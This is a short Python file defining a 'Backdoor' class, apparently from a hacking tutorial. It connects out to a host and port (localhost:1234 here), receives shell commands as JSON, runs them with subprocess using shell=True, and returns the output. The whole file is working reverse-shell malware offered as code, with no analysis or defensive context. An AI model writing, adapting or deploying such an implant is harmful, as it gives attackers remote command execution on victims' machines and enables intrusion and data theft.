import socket, json
import subprocess


class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def reliable_send(self,data):
        jason_data = json.dumps(data)
        self.connection.send(jason_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self,command):
        result = subprocess.check_output(command, shell=True)
        return result

    def run(self):
        while True:
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            self.reliable_send(command_result)

        self.connection.close()


my_backdoor =Backdoor("localhost",1234)
my_backdoor.run()